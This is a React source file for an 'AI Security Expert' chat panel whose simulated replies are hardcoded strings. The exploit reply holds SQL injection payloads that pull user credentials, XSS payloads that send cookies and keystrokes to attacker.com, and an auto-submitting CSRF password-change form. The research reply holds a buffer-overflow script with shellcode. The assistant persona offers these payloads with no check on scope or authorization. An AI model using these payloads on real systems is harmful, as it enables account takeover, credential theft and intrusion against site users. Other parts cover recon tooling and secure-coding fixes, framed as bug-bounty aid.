import React, { useState, useRef, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { 
  Send, Bot, User, Copy, Download, Trash2, Settings,
  Brain, MessageCircle, Code, Shield, Bug, Zap
} from 'lucide-react'
import toast from 'react-hot-toast'

interface ChatMessage {
  id: string
  type: 'user' | 'assistant'
  content: string
  timestamp: Date
  model?: string
  provider?: string
}

interface AIChatProps {
  onClose?: () => void
  initialMessage?: string
}

const AIChat: React.FC<AIChatProps> = ({ onClose, initialMessage }) => {
  const [messages, setMessages] = useState<ChatMessage[]>([])
  const [inputMessage, setInputMessage] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [selectedProvider, setSelectedProvider] = useState('openai')
  const [selectedModel, setSelectedModel] = useState('gpt-4')
  const [showSettings, setShowSettings] = useState(false)
  const messagesEndRef = useRef<HTMLDivElement>(null)

  const [chatSettings, setChatSettings] = useState({
    temperature: 0.7,
    maxTokens: 2000,
    systemPrompt: `You are an expert cybersecurity consultant and bug bounty hunter with deep knowledge of:

- OWASP Top 10 vulnerabilities and exploitation techniques
- Advanced penetration testing methodologies
- Bug bounty hunting strategies and tactics
- Vulnerability research and CVE analysis
- Secure coding practices and code review
- Network security and infrastructure assessment
- Web application security testing
- API security and testing methodologies
- Mobile application security
- Cloud security assessment

Provide detailed, actionable security advice with practical examples, exploitation techniques, and remediation strategies. Focus on real-world scenarios and current threat landscapes.`,
    enableContext: true,
    bugBountyMode: true
  })

  const modelOptions = {
    openai: [
      { value: 'gpt-4', label: 'GPT-4' },
      { value: 'gpt-4-turbo', label: 'GPT-4 Turbo' },
      { value: 'gpt-3.5-turbo', label: 'GPT-3.5 Turbo' }
    ],
    anthropic: [
      { value: 'claude-3-opus', label: 'Claude 3 Opus' },
      { value: 'claude-3-sonnet', label: 'Claude 3 Sonnet' },
      { value: 'claude-3-haiku', label: 'Claude 3 Haiku' }
    ],
    gemini: [
      { value: 'gemini-pro', label: 'Gemini Pro' },
      { value: 'gemini-pro-vision', label: 'Gemini Pro Vision' }
    ],
    mistral: [
      { value: 'mistral-large', label: 'Mistral Large' },
      { value: 'mistral-medium', label: 'Mistral Medium' },
      { value: 'mistral-small', label: 'Mistral Small' }
    ],
    openrouter: [
      { value: 'openrouter/auto', label: 'Auto (Best Available)' },
      { value: 'anthropic/claude-3-opus', label: 'Claude 3 Opus' },
      { value: 'openai/gpt-4-turbo', label: 'GPT-4 Turbo' },
      { value: 'google/gemini-pro', label: 'Gemini Pro' }
    ]
  }

  useEffect(() => {
    if (initialMessage) {
      setInputMessage(initialMessage)
    }
    
    // Initialize with welcome message
    setMessages([{
      id: '1',
      type: 'assistant',
      content: `🛡️ **AI Security Expert Ready!**

I'm your specialized cybersecurity assistant with expertise in:

• **Vulnerability Assessment** - OWASP Top 10, CVE research, exploit development
• **Bug Bounty Hunting** - Methodologies, tools, and advanced techniques  
• **Penetration Testing** - Web apps, APIs, networks, and infrastructure
• **Code Security** - Static analysis, secure coding, and vulnerability patterns
• **Threat Intelligence** - Current attack vectors and defense strategies

**Quick Start Commands:**
• \`analyze [URL]\` - Security assessment of a target
• \`exploit [vulnerability]\` - Exploitation techniques and payloads
• \`secure [code]\` - Code security review and recommendations
• \`research [CVE]\` - Vulnerability research and analysis
• \`tools [category]\` - Security tool recommendations

What security challenge can I help you with today?`,
      timestamp: new Date(),
      model: selectedModel,
      provider: selectedProvider
    }])
  }, [initialMessage])

  useEffect(() => {
    scrollToBottom()
  }, [messages])

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }

  const sendMessage = async () => {
    if (!inputMessage.trim() || isLoading) return

    const userMessage: ChatMessage = {
      id: Date.now().toString(),
      type: 'user',
      content: inputMessage,
      timestamp: new Date()
    }

    setMessages(prev => [...prev, userMessage])
    setInputMessage('')
    setIsLoading(true)

    try {
      // Simulate AI response (replace with actual API call)
      const response = await simulateAIResponse(inputMessage)
      
      const assistantMessage: ChatMessage = {
        id: (Date.now() + 1).toString(),
        type: 'assistant',
        content: response,
        timestamp: new Date(),
        model: selectedModel,
        provider: selectedProvider
      }

      setMessages(prev => [...prev, assistantMessage])
    } catch (error) {
      toast.error('Failed to get AI response. Please check your API configuration.')
    } finally {
      setIsLoading(false)
    }
  }

  const simulateAIResponse = async (message: string): Promise<string> => {
    // Simulate API delay
    await new Promise(resolve => setTimeout(resolve, 1500))

    const lowerMessage = message.toLowerCase()

    if (lowerMessage.includes('analyze') || lowerMessage.includes('assessment')) {
      return generateSecurityAnalysisResponse(message)
    } else if (lowerMessage.includes('exploit') || lowerMessage.includes('payload')) {
      return generateExploitResponse(message)
    } else if (lowerMessage.includes('secure') || lowerMessage.includes('code review')) {
      return generateCodeSecurityResponse(message)
    } else if (lowerMessage.includes('research') || lowerMessage.includes('cve')) {
      return generateVulnResearchResponse(message)
    } else if (lowerMessage.includes('tools') || lowerMessage.includes('recommend')) {
      return generateToolRecommendationResponse(message)
    } else {
      return generateGeneralSecurityResponse(message)
    }
  }

  const generateSecurityAnalysisResponse = (message: string) => {
    return `🔍 **Security Analysis Framework**

Based on your request, here's a comprehensive security assessment approach:

**1. Reconnaissance Phase**
\`\`\`bash
# Subdomain enumeration
subfinder -d target.com | httpx -silent
amass enum -d target.com

# Technology stack detection
whatweb target.com
wappalyzer target.com
\`\`\`

**2. Vulnerability Assessment**
- **OWASP Top 10 Testing**
  - Injection flaws (SQL, NoSQL, LDAP, OS)
  - Broken authentication and session management
  - Sensitive data exposure
  - XML external entities (XXE)
  - Broken access control

**3. Advanced Testing Techniques**
- **Business Logic Flaws**
  - Race conditions in payment processing
  - Privilege escalation through parameter manipulation
  - Workflow bypass vulnerabilities

**4. Automated Scanning**
\`\`\`bash
# Nuclei for CVE detection
nuclei -u target.com -t cves/

# Burp Suite automation
burp-cli --target=target.com --scan-type=active
\`\`\`

**5. Manual Testing Focus Areas**
- Authentication mechanisms
- Session management
- Input validation
- Authorization controls
- Error handling

**Next Steps:**
1. Start with passive reconnaissance
2. Map the application attack surface
3. Identify high-value targets
4. Perform targeted vulnerability testing
5. Develop proof-of-concept exploits

Would you like me to elaborate on any specific testing methodology?`
  }

  const generateExploitResponse = (message: string) => {
    return `💥 **Exploit Development Guide**

**SQL Injection Exploitation:**

**1. Detection and Enumeration**
\`\`\`sql
-- Basic detection
' OR '1'='1
' OR 1=1--
' OR 1=1#

-- Database enumeration
' UNION SELECT 1,2,3,database(),user(),version()--
' UNION SELECT 1,2,3,schema_name,4,5 FROM information_schema.schemata--
\`\`\`

**2. Data Extraction**
\`\`\`sql
-- Extract user data
' UNION SELECT 1,username,password,email,5,6 FROM users--

-- Extract sensitive tables
' UNION SELECT 1,table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()--
\`\`\`

**3. Advanced Techniques**
\`\`\`sql
-- Time-based blind injection
'; IF(1=1) WAITFOR DELAY '00:00:05'--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Boolean-based blind injection
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
\`\`\`

**XSS Exploitation:**

**1. Reflected XSS Payloads**
\`\`\`javascript
// Basic payload
<script>alert('XSS')</script>

// Cookie stealing
<script>fetch('//attacker.com/steal?cookie='+document.cookie)</script>

// Keylogger
<script>document.addEventListener('keypress',function(e){fetch('//attacker.com/keys?key='+e.key)})</script>
\`\`\`

**2. DOM-based XSS**
\`\`\`javascript
// URL fragment exploitation
#<script>alert('XSS')</script>

// PostMessage exploitation
window.postMessage('<script>alert("XSS")</script>', '*');
\`\`\`

**CSRF Exploitation:**
\`\`\`html
<!-- Password change CSRF -->
<form action="https://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

**Mitigation Bypass Techniques:**
- WAF evasion using encoding
- Rate limiting bypass via headers
- Authentication bypass through parameter pollution

Need specific payloads for a particular vulnerability type?`
  }

  const generateCodeSecurityResponse = (message: string) => {
    return `📝 **Code Security Review Guidelines**

**Common Vulnerability Patterns:**

**1. SQL Injection Vulnerabilities**
\`\`\`php
// VULNERABLE
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// SECURE
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
\`\`\`

**2. XSS Prevention**
\`\`\`javascript
// VULNERABLE
document.innerHTML = userInput;

// SECURE
document.textContent = userInput;
// OR use DOMPurify for HTML content
document.innerHTML = DOMPurify.sanitize(userInput);
\`\`\`

**3. Authentication Flaws**
\`\`\`python
# VULNERABLE - Weak password hashing
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()

# SECURE - Strong password hashing
import bcrypt
password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
\`\`\`

**4. Insecure Direct Object References**
\`\`\`java
// VULNERABLE
String userId = request.getParameter("userId");
User user = userService.getUser(userId);

// SECURE
String userId = request.getParameter("userId");
if (authService.canAccessUser(currentUser, userId)) {
    User user = userService.getUser(userId);
}
\`\`\`

**Security Code Review Checklist:**

**Input Validation:**
- [ ] All user inputs are validated
- [ ] Whitelist validation is used
- [ ] Input length limits are enforced
- [ ] Special characters are handled properly

**Authentication & Authorization:**
- [ ] Strong password policies
- [ ] Secure session management
- [ ] Proper access controls
- [ ] Multi-factor authentication

**Data Protection:**
- [ ] Sensitive data encryption
- [ ] Secure data transmission (HTTPS)
- [ ] Proper key management
- [ ] Data sanitization

**Error Handling:**
- [ ] No sensitive information in errors
- [ ] Proper logging implementation
- [ ] Graceful error handling
- [ ] Security event monitoring

**Automated Security Testing:**
\`\`\`bash
# Static analysis
semgrep --config=auto /path/to/code

# Dependency scanning
npm audit
snyk test

# SAST tools
sonarqube-scanner
checkmarx-cli
\`\`\`

Would you like me to review specific code snippets or elaborate on any security pattern?`
  }

  const generateVulnResearchResponse = (message: string) => {
    return `🔬 **Vulnerability Research Methodology**

**CVE Research Process:**

**1. Vulnerability Intelligence Gathering**
\`\`\`bash
# CVE databases
curl -s "https://cve.circl.lu/api/cve/CVE-2023-XXXX"
searchsploit "application name"

# Exploit databases
exploitdb --search="vulnerability type"
metasploit search type:exploit platform:linux
\`\`\`

**2. Proof of Concept Development**

**Buffer Overflow Example:**
\`\`\`python
#!/usr/bin/env python3
import socket
import struct

# Vulnerable application exploitation
target = "192.168.1.100"
port = 9999

# Shellcode (msfvenom generated)
shellcode = (
    "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
    "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

# Buffer overflow payload
buffer = "A" * 1024 + struct.pack("<I", 0x08048484) + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(buffer)
s.close()
\`\`\`

**3. Web Application Vulnerability Research**

**Zero-Day Discovery Process:**
1. **Target Selection**
   - Popular applications with large user bases
   - Recently updated software (new features = new bugs)
   - Applications with complex functionality

2. **Attack Surface Analysis**
   - Input validation points
   - Authentication mechanisms
   - File upload functionality
   - API endpoints

3. **Fuzzing Strategies**
\`\`\`bash
# Web application fuzzing
ffuf -w wordlist.txt -u https://target.com/FUZZ
wfuzz -c -z file,payloads.txt --hc 404 https://target.com/FUZZ

# API fuzzing
restler-fuzzer --api_spec swagger.json --target_ip target.com
\`\`\`

**4. Advanced Research Techniques**

**Binary Analysis:**
\`\`\`bash
# Static analysis
objdump -d binary
strings binary | grep -i password
radare2 binary

# Dynamic analysis
gdb binary
strace ./binary
ltrace ./binary
\`\`\`

**Source Code Analysis:**
\`\`\`bash
# Pattern matching for vulnerabilities
grep -r "strcpy\\|strcat\\|sprintf" source/
semgrep --config=security source/
codeql database analyze --format=csv --output=results.csv
\`\`\`

**5. Responsible Disclosure**

**Bug Bounty Submission:**
1. **Clear Impact Description**
2. **Step-by-step Reproduction**
3. **Proof of Concept Code**
4. **Remediation Recommendations**
5. **CVSS Scoring Justification**

**Research Tools:**
- **Ghidra** - Reverse engineering
- **IDA Pro** - Binary analysis
- **Burp Suite** - Web application testing
- **Nuclei** - Vulnerability scanning
- **AFL++** - Fuzzing framework

Want me to dive deeper into any specific research area or vulnerability type?`
  }

  const generateToolRecommendationResponse = (message: string) => {
    return `🛠️ **Security Tools Arsenal**

**Reconnaissance & OSINT:**
\`\`\`bash
# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com
assetfinder target.com

# Port scanning
nmap -sS -sV -O target.com
masscan -p1-65535 target.com --rate=1000

# Technology detection
whatweb target.com
wappalyzer-cli target.com
\`\`\`

**Web Application Testing:**

**Essential Tools:**
- **Burp Suite Professional** - Comprehensive web app testing
- **OWASP ZAP** - Free alternative to Burp
- **Nuclei** - Fast vulnerability scanner
- **SQLMap** - Automated SQL injection testing
- **XSStrike** - Advanced XSS detection

**Advanced Testing:**
\`\`\`bash
# Directory/file discovery
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -w wordlist.txt -u https://target.com/FUZZ

# Parameter discovery
arjun -u https://target.com/endpoint
paramspider -d target.com

# JavaScript analysis
linkfinder -i https://target.com -o cli
secretfinder -i https://target.com/app.js
\`\`\`

**API Security Testing:**
- **Postman** - API testing and automation
- **Insomnia** - REST client
- **GraphQL Voyager** - GraphQL schema exploration
- **Kiterunner** - API endpoint discovery

**Network Security:**
\`\`\`bash
# Network scanning
nmap -sC -sV -A target.com
unicornscan target.com

# SSL/TLS testing
sslscan target.com
testssl.sh target.com

# Wireless testing
aircrack-ng
kismet
wifite
\`\`\`

**Mobile Application Testing:**
- **MobSF** - Mobile security framework
- **Frida** - Dynamic instrumentation
- **Objection** - Runtime mobile exploration
- **APKTool** - Android APK analysis

**Cloud Security:**
\`\`\`bash
# AWS security
scout2
prowler
cloudsploit

# Multi-cloud
ScoutSuite
cloudsplaining
\`\`\`

**Exploitation Frameworks:**
- **Metasploit** - Comprehensive exploitation
- **Cobalt Strike** - Advanced threat emulation
- **Empire** - PowerShell post-exploitation
- **Covenant** - .NET command and control

**Custom Tool Development:**
\`\`\`python
# Example: Custom vulnerability scanner
import requests
import threading
from urllib.parse import urljoin

class VulnScanner:
    def __init__(self, target):
        self.target = target
        self.vulnerabilities = []
    
    def scan_sql_injection(self, endpoint):
        payloads = ["'", "' OR '1'='1", "'; DROP TABLE users--"]
        for payload in payloads:
            try:
                response = requests.get(f"{endpoint}?id={payload}")
                if "error" in response.text.lower():
                    self.vulnerabilities.append(f"SQL Injection: {endpoint}")
            except:
                pass
    
    def scan_xss(self, endpoint):
        payload = "<script>alert('XSS')</script>"
        try:
            response = requests.get(f"{endpoint}?q={payload}")
            if payload in response.text:
                self.vulnerabilities.append(f"XSS: {endpoint}")
        except:
            pass
\`\`\`

**Bug Bounty Automation:**
\`\`\`bash
#!/bin/bash
# Automated recon pipeline
target=$1

# Subdomain enumeration
subfinder -d $target | tee subdomains.txt
amass enum -d $target >> subdomains.txt

# Live subdomain check
cat subdomains.txt | httpx -silent | tee live_subdomains.txt

# Vulnerability scanning
nuclei -l live_subdomains.txt -t cves/ -o vulnerabilities.txt

# Directory fuzzing
while read subdomain; do
    gobuster dir -u $subdomain -w /usr/share/wordlists/dirb/common.txt
done < live_subdomains.txt
\`\`\`

**Tool Configuration Tips:**
1. **Burp Suite Extensions**: Logger++, Autorize, Param Miner
2. **Nuclei Templates**: Keep updated with latest CVEs
3. **Custom Wordlists**: Build domain-specific wordlists
4. **Automation**: Create bash scripts for repetitive tasks

Which category would you like me to elaborate on or need specific tool configurations?`
  }

  const generateGeneralSecurityResponse = (message: string) => {
    return `🛡️ **Cybersecurity Guidance**

I'm here to help with your security questions! Based on your message: "${message}"

**Common Security Topics I Can Help With:**

**🔍 Vulnerability Assessment**
- Web application security testing
- Network penetration testing
- Mobile application security
- API security assessment
- Cloud security evaluation

**🎯 Bug Bounty Hunting**
- Target reconnaissance methodologies
- Vulnerability discovery techniques
- Exploit development and chaining
- Report writing and impact assessment
- Tool automation and scripting

**💻 Secure Development**
- Secure coding practices
- Code review methodologies
- SAST/DAST implementation
- DevSecOps integration
- Threat modeling

**🌐 Infrastructure Security**
- Network security architecture
- Cloud security best practices
- Container and Kubernetes security
- Identity and access management
- Incident response planning

**📚 Learning Resources**
- OWASP guidelines and standards
- CVE research and analysis
- Security certification paths
- Hands-on lab environments
- Industry best practices

**Quick Commands You Can Use:**
- \`analyze [URL]\` - Security assessment guidance
- \`exploit [vulnerability]\` - Exploitation techniques
- \`secure [technology]\` - Security best practices
- \`research [topic]\` - Vulnerability research help
- \`tools [category]\` - Tool recommendations

**Example Questions:**
- "How do I test for SQL injection in GraphQL APIs?"
- "What's the best approach for mobile app penetration testing?"
- "Can you help me understand SSRF vulnerabilities?"
- "What tools should I use for cloud security assessment?"

Feel free to ask specific questions about any security topic, and I'll provide detailed, actionable guidance with examples and best practices!

What specific security challenge would you like to tackle?`
  }

  const copyMessage = (content: string) => {
    navigator.clipboard.writeText(content)
    toast.success('Message copied to clipboard')
  }

  const clearChat = () => {
    setMessages([])
    toast.success('Chat cleared')
  }

  const exportChat = () => {
    const chatData = {
      timestamp: new Date().toISOString(),
      messages: messages,
      settings: chatSettings,
      provider: selectedProvider,
      model: selectedModel
    }
    
    const dataStr = JSON.stringify(chatData, null, 2)
    const dataBlob = new Blob([dataStr], { type: 'application/json' })
    const url = URL.createObjectURL(dataBlob)
    const link = document.createElement('a')
    link.href = url
    link.download = `ai_security_chat_${new Date().toISOString().split('T')[0]}.json`
    link.click()
    URL.revokeObjectURL(url)
    toast.success('Chat exported successfully')
  }

  return (
    <div className="flex flex-col h-full bg-white dark:bg-gray-900">
      {/* Header */}
      <div className="flex items-center justify-between p-4 border-b border-gray-200 dark:border-gray-700 bg-gradient-to-r from-blue-600 to-purple-600">
        <div className="flex items-center space-x-3">
          <Brain className="w-6 h-6 text-white" />
          <div>
            <h3 className="font-semibold text-white">AI Security Expert</h3>
            <p className="text-xs text-blue-100">{selectedProvider} • {selectedModel}</p>
          </div>
        </div>
        <div className="flex items-center space-x-2">
          <button
            onClick={() => setShowSettings(!showSettings)}
            className="p-2 text-white hover:bg-white/20 rounded-lg transition-colors"
          >
            <Settings className="w-4 h-4" />
          </button>
          <button
            onClick={exportChat}
            className="p-2 text-white hover:bg-white/20 rounded-lg transition-colors"
          >
            <Download className="w-4 h-4" />
          </button>
          <button
            onClick={clearChat}
            className="p-2 text-white hover:bg-white/20 rounded-lg transition-colors"
          >
            <Trash2 className="w-4 h-4" />
          </button>
          {onClose && (
            <button
              onClick={onClose}
              className="p-2 text-white hover:bg-white/20 rounded-lg transition-colors"
            >
              ×
            </button>
          )}
        </div>
      </div>

      {/* Settings Panel */}
      <AnimatePresence>
        {showSettings && (
          <motion.div
            initial={{ height: 0 }}
            animate={{ height: 'auto' }}
            exit={{ height: 0 }}
            className="border-b border-gray-200 dark:border-gray-700 overflow-hidden"
          >
            <div className="p-4 space-y-4 bg-gray-50 dark:bg-gray-800">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                    AI Provider
                  </label>
                  <select
                    value={selectedProvider}
                    onChange={(e) => setSelectedProvider(e.target.value)}
                    className="input-field text-sm"
                  >
                    <option value="openai">OpenAI</option>
                    <option value="anthropic">Anthropic</option>
                    <option value="gemini">Google Gemini</option>
                    <option value="mistral">Mistral</option>
                    <option value="openrouter">OpenRouter</option>
                  </select>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                    Model
                  </label>
                  <select
                    value={selectedModel}
                    onChange={(e) => setSelectedModel(e.target.value)}
                    className="input-field text-sm"
                  >
                    {modelOptions[selectedProvider as keyof typeof modelOptions]?.map(model => (
                      <option key={model.value} value={model.value}>
                        {model.label}
                      </option>
                    ))}
                  </select>
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Temperature: {chatSettings.temperature}
                </label>
                <input
                  type="range"
                  min="0"
                  max="1"
                  step="0.1"
                  value={chatSettings.temperature}
                  onChange={(e) => setChatSettings(prev => ({ ...prev, temperature: parseFloat(e.target.value) }))}
                  className="w-full"
                />
              </div>

              <div className="flex items-center space-x-4">
                <label className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    checked={chatSettings.bugBountyMode}
                    onChange={(e) => setChatSettings(prev => ({ ...prev, bugBountyMode: e.target.checked }))}
                    className="rounded"
                  />
                  <span className="text-sm text-gray-700 dark:text-gray-300">Bug Bounty Mode</span>
                </label>
                <label className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    checked={chatSettings.enableContext}
                    onChange={(e) => setChatSettings(prev => ({ ...prev, enableContext: e.target.checked }))}
                    className="rounded"
                  />
                  <span className="text-sm text-gray-700 dark:text-gray-300">Context Awareness</span>
                </label>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Messages */}
      <div className="flex-1 overflow-y-auto p-4 space-y-4">
        {messages.map((message) => (
          <motion.div
            key={message.id}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className={`flex ${message.type === 'user' ? 'justify-end' : 'justify-start'}`}
          >
            <div className={`max-w-[85%] p-4 rounded-lg relative group ${
              message.type === 'user'
                ? 'bg-blue-600 text-white'
                : 'bg-gray-100 dark:bg-gray-800 text-gray-900 dark:text-white'
            }`}>
              <div className="flex items-start space-x-2 mb-2">
                {message.type === 'user' ? (
                  <User className="w-4 h-4 mt-1" />
                ) : (
                  <Bot className="w-4 h-4 mt-1" />
                )}
                <div className="flex-1">
                  <div className="prose prose-sm max-w-none dark:prose-invert">
                    {message.content.split('\n').map((line, i) => {
                      if (line.startsWith('```')) {
                        return null // Handle code blocks separately
                      }
                      if (line.startsWith('**') && line.endsWith('**')) {
                        return <div key={i} className="font-bold mt-2 mb-1">{line.slice(2, -2)}</div>
                      }
                      if (line.startsWith('- ') || line.startsWith('• ')) {
                        return <div key={i} className="ml-4">• {line.slice(2)}</div>
                      }
                      if (line.trim() === '') {
                        return <div key={i} className="h-2" />
                      }
                      return <div key={i}>{line}</div>
                    })}
                  </div>
                </div>
              </div>
              
              <button
                onClick={() => copyMessage(message.content)}
                className="absolute top-2 right-2 opacity-0 group-hover:opacity-100 p-1 hover:bg-black/10 rounded transition-all"
              >
                <Copy className="w-3 h-3" />
              </button>
              
              <div className="text-xs opacity-70 mt-2 flex items-center justify-between">
                <span>{message.timestamp.toLocaleTimeString()}</span>
                {message.model && (
                  <span className="text-xs">{message.provider} • {message.model}</span>
                )}
              </div>
            </div>
          </motion.div>
        ))}
        
        {isLoading && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="flex justify-start"
          >
            <div className="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg">
              <div className="flex items-center space-x-2">
                <Bot className="w-4 h-4" />
                <div className="flex space-x-1">
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" />
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.1s' }} />
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }} />
                </div>
              </div>
            </div>
          </motion.div>
        )}
        
        <div ref={messagesEndRef} />
      </div>

      {/* Input */}
      <div className="p-4 border-t border-gray-200 dark:border-gray-700">
        <div className="flex space-x-2">
          <input
            type="text"
            value={inputMessage}
            onChange={(e) => setInputMessage(e.target.value)}
            onKeyPress={(e) => e.key === 'Enter' && sendMessage()}
            placeholder="Ask about vulnerabilities, exploits, or security best practices..."
            className="input-field flex-1"
            disabled={isLoading}
          />
          <button
            onClick={sendMessage}
            disabled={isLoading || !inputMessage.trim()}
            className="btn-primary p-3 disabled:opacity-50"
          >
            <Send className="w-4 h-4" />
          </button>
        </div>
      </div>
    </div>
  )
}

export default AIChat